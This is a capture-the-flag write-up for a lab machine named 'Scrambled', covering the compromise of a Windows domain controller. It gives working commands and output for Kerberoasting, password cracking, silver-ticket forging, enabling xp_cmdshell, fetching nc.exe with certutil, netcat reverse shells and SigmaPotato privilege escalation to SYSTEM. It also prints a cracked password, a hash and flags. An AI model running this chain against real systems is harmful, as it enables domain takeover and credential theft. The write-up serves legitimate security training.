
## CTF Writeup: Scrambled

---
## Reconnaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.44.233    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-04 16:14 -0500
Nmap scan report for 10.129.44.233
Host is up (0.016s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Scramble Corp Intranet
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-04 21:16:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-04T21:19:44+00:00; +1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2026-08-04T21:19:44+00:00; +2s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2026-08-04T21:19:44+00:00; +1s from scanner time.
| ms-sql-info: 
|   10.129.44.233:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-04T21:12:30
|_Not valid after:  2056-08-04T21:12:30
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2026-08-04T21:19:44+00:00; +1s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-04T21:19:44+00:00; +2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.99%I=7%D=8/4%Time=6A7256B5%P=x86_64-pc-linux-gnu%r(NUL
SF:L,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMBLECO
SF:RP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3
SF:;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_ORDERS
SF:_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMBLECO
SF:RP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"SCRA
SF:MBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLECORP
SF:_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDERS_V
SF:1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOW
SF:N_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n"
SF:)%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TLSS
SF:essionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_V1\.
SF:0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(FourOh
SF:FourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;
SF:\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_C
SF:OMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,35,"S
SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LANDesk-
SF:RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCRAMBL
SF:ECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\
SF:n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D,"SC
SF:RAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORDERS_
SF:V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(
SF:ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLECORP
SF:_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-04T21:19:05
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 300.42 seconds
```

The target seems to be an Domain Controller. The scan itself provides information about the Domainname "crsm.local", the FQDN "DC1.crsm.local" & the Hostname "DC01". Let's map them to the target ip address in our local dns file.

```
echo "10.129.44.233 DC1.crsm.local crsm.local DC1" | tee -a /etc/hosts
```

Analysis:

- Port 80 open
- MSSQL publicly open
- Unknown port on 4411

Started off with checking if anonymous & guest user access are enabled. But not possible.
Tried running enum4linux to enumerate SMB, but wasn't possible.

```
enum4linux -a crsm.local
```

Checked if we can retrieve LDAP information anonymously. But didn't work.

```
ldapsearch -v -x -b "DC=crsm,DC=local" -H "ldap://10.129.44.233" "(objectclass=*)"
```

Upon inspecting port 4411 in the browser we get the following information.

```
SCRAMBLECORP_ORDERS_V1.0.3;
ERROR_UNKNOWN_COMMAND;
SESSION_TIMED_OUT;
```

This seems to be some custom service for "scramble corp". 

I proceeded analysis on the website running on port 80. It seems to be the intranet of scramble corp.

At the "IT-Services" Tab we find an functionality of "Contacting IT Support". Which hints at an potential Phishing / NTLM Relay Attack!

```
feroxbuster --url http://crsm.local
```

Since we are supposed to send an e-mail to the IT-Support with an "ip.txt" file attached to, they will probably press on it. We could potentially create an malicious .txt file which steals the NTLM Hash or plaintext password. But since there is no mail server up & running we can forget abt this! It also revealed an potential username named "ksimpson".

In the "Password Resets" Tab we are provided with the information, that if we give them our username they reset our password to the username. Let's try to reset user "ksimpson"'s password.

But since there is no mail server we can't send an e-mail to them. Perhaps let's check if auth is already enabled.

```
kerbrute bruteuser --dc 10.129.44.233 -d scrm.local users.txt ksimpson

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/04/26 - Ronnie Flathers @ropnop

2026/08/04 17:25:41 >  Using KDC(s):
2026/08/04 17:25:41 >   10.129.44.233:88

2026/08/04 17:25:41 >  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson
2026/08/04 17:25:41 >  Done! Tested 1 logins (1 successes) in 0.074 seconds
```

It is! But we couldn't connect via WinRM unfortunately. Let's request an TGT for the user.

```
impacket-getTGT scrm.local/ksimpson:ksimpson -dc-ip 10.129.44.233
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ksimpson.ccache
```

Exported the ticket inside our kerberos cache.

```
export KRB5CCNAME=ksimpson.ccache
```

Since evil-winrm wasn't working I decided to check out SMB Shares.

```
impacket-smbclient scrm.local/ksimpson@dc1.scrm.local -k -no-pass
```

```
shares
use Public
get Network Security Changes.pdf 
```

Inspected the .pdf file.

```
evince Network\ Security\ Changes.pdf
```

The .PDF File was an deadend. Even checking forensics didn't provide us with anything.

```
strings Network\ Security\ Changes.pdf | head -n 20
```

Since we can't really authenticate via WinRM so far, let's try & perform Kerberoasting with our cached Ticket!

```
impacket-GetUserSPNs -request -dc-ip 10.129.44.233 -dc-host dc1.scrm.local scrm.local/ksimpson -k -no-pass
```

Boom! This gave us the TGT of the SQL Service Account!

I proceeded with trying to crack the TGT using hashcat.

```
hashcat -m 13100 sql_svc /usr/share/wordlists/rockyou.txt
```

```
sql_svc:Pegasus60
```

But I wasn't able to authenticate via impacket-mssqlclient which was very odd. I was hardstuck here and had to check.

Rereading the .pdf file actually revealed that only Administrator Accounts can access the MSSQL Database, so not even the sql_svc account.

Apparently I need to perform an Silver Ticket Attack.
## Silver Ticket Attack

This is how it works: If we have valid Credentials for sql_svc, we can perform a Silver Ticket Attack to impersonate the Domain Admin, but only for the specific service that this service account runs!

We won't become Domain Admin everywhere (that requires a Golden Ticket). Instead we will gain Administrator-level access exclusively to the backend service (MSSQL) in this case.

**Prerequisites:**

```
1. The NTLM Hash of sql_svc
2. The Domain SID
3. The FQDN of the target machine
4. The SPN of the sql_svc
```

1. Get the NTLM Hash

Utilize the following website & paste the password of the sql_svc account inside.
This will generate an NTLM Hash for the password.

```
https://www.browserling.com/tools/ntlm-hash
```

NTLM Hash

```
B999A16500B87D17EC7F2E2A68778F05
```

2. Get SID of the Domain

The "DRSCrackNames" revealed the Domain Admin SID

```
impacket-secretsdump -k scrm.local/ksimpson@dc1.scrm.local -no-pass -debug
```

We need to append the -500 at the end and we gained the Domain SID

```
S-1-5-21-2743207045-1827831105-2542523200
```

3. Retrieve SPN of sql_svc

```
impacket-GetUserSPNs -request -dc-ip 10.129.44.233 -dc-host dc1.scrm.local scrm.local/ksimpson -k -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 11:32:02.351452  2026-08-04 16:12:27.927633             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 11:32:02.351452  2026-08-04 16:12:27.927633
```

4. Forge Silver Ticket

```
impacket-ticketer -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -nthash B999A16500B87D17EC7F2E2A68778F05 -domain scrm.local -user-id 500 Administrator -spn MSSQLSVC/dc1.scrm.local
```

This created and saved an Administrator.ccache Ticket which enables us to connect via impacket-mssqlclient as Administrator!

5. Export it

```
export KRB5CCNAME=$(pwd)/Administrator.ccache
```

6. Connected to the target and gained MSSQL Shell

```
impacket-mssqlclient dc1.scrm.local -k -no-pass
```

I tried to utilize xp_cmdshell to get Command Execution, but didn't work.

```
SQL (SCRM\administrator  dbo@master)> EXEC xp_cmdshell 'whoami';
ERROR(DC1): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

Let's activate xp_cmdshell!

1. Step: Show advanced options (required)

```
EXEC sp_configure 'show advanced options', '1';
```

```
RECONFIGURE;
```

2. Step: Enable xp_cmdshell

```
EXEC sp_configure 'xp_cmdshell', '1';
```

```
RECONFIGURE;
```

3. Step: Verify it's enabled

```
EXEC sp_configure 'xp_cmdshell';
```

Verified if Command Execution is working & it did.

```
EXEC xp_cmdshell "whoami";
output        
-----------   
scrm\sqlsvc   
NULL
```

Let's get RCE! Transfered nc.exe onto target server.

Started up python3 webserver.

```
python3 -m http.server 445
```

```
EXEC xp_cmdshell "certutil -urlcache -split -f http://10.10.15.9:445/nc.exe C:\Windows\Tasks\nc.exe";
```

Started up netcat listener on port 443.

```
rlwrap nc -lvnp 443
```

Executed reverse connection to my local machine.

```
EXEC xp_cmdshell "C:\Windows\Tasks\nc.exe 10.10.15.9 443 -e cmd.exe";
```

Gained RCE.

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.15.9] from (UNKNOWN) [10.129.44.233] 60798
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
## Privilege Escalation

Enumerated privileges and groups of the current user and identified that "SeImpersonatePrivilege" seems to be enabled. Let's abuse it!

We'll start off trying PrintSpoofer, since it's very reliable.

Let's transfer it onto the target server.

```
certutil -urlcache -split -f http://10.10.15.9:445/PrintSpoofer.exe PrintSpoofer.exe
```

This unfortunately didn't workout.

```
PrintSpoofer.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[-] Operation failed or timed out.
```

Enumerating the OS, we found out that it's an Windows Server 2019 OS.

```
systeminfo
```

Let's try SweetPotato!

```
certutil -urlcache -split -f http://10.10.15.9:445/SweetPotato.exe SweetPotato.exe
```

This didn't work unfortunately.

```
SweetPotato.exe -a "whoami"
```

Let's try SigmaPotato, since it works from 2012-2022.

```
certutil -urlcache -split -f http://10.10.15.9:445/SigmaPotato.exe SigmaPotato.exe
```

Let's check if it works. It did!

```
C:\Temp>SigmaPotato.exe whoami
SigmaPotato.exe whoami
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
[+] Searching for System Token...
[+] PID: 900 | Token: 0x388 | User: NT AUTHORITY\SYSTEM
[+] Found System Token: True
[+] Duplicating Token...
[+] New Token Handle: 956
[+] Current Command Length: 6 characters
[+] Creating Process via 'CreateProcessAsUserW'
[+] Process Started with PID: 5904

[+] Process Output:
nt authority\system
```

Let's get RCE to comprimise the Domain Controller. 

Started up netcat listener on my local machine on port 88.

```
rlwrap nc -lvnp 88
```

Executed the following command:

```
SigmaPotato.exe --revshell 10.10.15.9 88
```

Gained RCE as SYSTEM.

```
rlwrap nc -lvnp 88  
listening on [any] 88 ...
connect to [10.10.15.9] from (UNKNOWN) [10.129.44.233] 57735

PS C:\Temp>
```

Retrieved user.txt in C:\Users\miscsvc\Desktop.

```
a4d873d6453e453e6141be77b86d857f
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
fba422c02b6f42859cbefe52c170ecb0
```